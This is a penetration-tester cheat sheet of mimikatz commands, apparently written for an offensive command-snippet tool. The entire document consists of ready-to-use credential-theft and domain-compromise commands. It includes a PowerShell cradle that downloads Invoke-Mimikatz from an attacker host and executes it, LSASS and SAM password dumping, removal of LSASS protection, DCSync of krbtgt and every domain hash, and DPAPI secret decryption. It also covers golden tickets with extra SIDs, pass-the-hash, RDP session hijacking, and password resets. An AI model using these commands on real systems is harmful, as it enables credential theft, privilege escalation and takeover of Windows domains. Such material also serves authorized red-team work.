# mimikatz

% mimikatz, passwords
#plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 

## ps1 - load Invoke-Mimikatz
https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/Invoke-Mimikatz.ps1') | IEX ; Invoke-mimikatz
```

## mimikatz onliner
```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords /all" "lsadump::sam" "exit"
```

## mimikatz disable PPL and dump passwords
```
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords /all" "exit"
```

## mimikatz - vault - Get passwords of scheduled tasks
```
mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
```

## mimikatz - dcsync - user (krbtgt/Administrator)
```
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain> /user:<user>" "exit"
```


## mimikatz - dcsync - all (krbtgt/Administrator)
```
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain> /all /csv" "exit"
```

## mimikatz - extract credentials from dump
```
mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords /all" "exit"
```

## mimikatz - extract credentials from shadow copy (1)
```
mimikatz.exe "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"
```

## mimikatz - extract credentials from shadow copy (2)
Extract old passwords
```
mimikatz.exe "lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY"
```

## extract - on hand shadow volume copy
```
powershell.exe "[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM', '.\Desktop\SYSTEM.bkp');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY', '.\Desktop\SECURITY.bkp');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM', '.\Desktop\SAM.bkp')"
```

% mimikatz, tickets

## mimikatz - tickets - list
```
sekurksa::tickets
```

## mimikatz - tickets - extract 
```
sekurlsa::tickets /export
```

% mimikatz, dpapi, credman


## mimikatz - credman - List Credentials Manager
```
sekurlsa::Credman
```


## mimikatz - dpapi - check the file to get guidMasterKey
Seatbelt come in handy for enumerating credential blob files' location
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\<credfile>
```

## mimikatz - dpapi - find master key
```
$ mimikatz !sekurlsa::dpapi
```

## mimikatz - dpapi - use master key
sid : origin domain sid : Get-DomainSID -Domain domainname
sid : origin domain sid : Get-DomainSID -Domain domainname
```
$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\<credfile> /masterkey:<masterkey>
```

## mimikatz - dpapi - Extract masterkey Administrator
```
mimikatz sekurlsa::dpapi
```


## mimikatz - dpapi - Extract masterkey with password
```
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\<guidMasterKey>" /sid:<SID> /password:<password> /protected
```

## mimikatz - dpapi - Extract masterkey AD
```
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\<guidMasterKey>" /rpc
```


% mimikatz, ad


## mimikatz - forest extra SID
sid : origin domain sid : Get-DomainSID -Domain domainname
sids :  ExtraSid value (Enterprise Admins SID) : parent SID	
```powershell
kerberos::golden /user:<user> /domain:<domain> /sid:<child_sid> /krbtgt:<krbtgt_ntlm> /sids:<parent_sid>-519 /ptt
```

% mimikatz, pth

## pth run powershell remotelly
#plateform/windows  #target/local  #cat/ATTACK/PTH 
Followed by : Enter-PSSession -Computer {<}computer_name}
```
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell
```

## pth to RDP
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/ATTACK/PTH
```
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:"mstsc.exe /restrictedadmin"
```

% mimikatz, rdp

## Extract RDP passwords
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 
```
ts::logonpasswords
```

## List RDP sessions 
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/RECON
```
ts::sessions
```

## Hijack RDP session 
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/ATTACK/HIJACK
```
ts::remote /id:<id>
```


## change user password (Reset Domain)
#plateform/windows #target/local #cat/CREDENTIAL-ACCESS
```
lsadump::setntlm /user:<target_user> /password:VeryStrongPass1! /server:<dc_name>
```


## change user password (Reset Local)
#plateform/windows #target/local #cat/CREDENTIAL-ACCESS
```
lsadump::setntlm /user:<target_user> /password:VeryStrongPass1! /server:<target_name>
```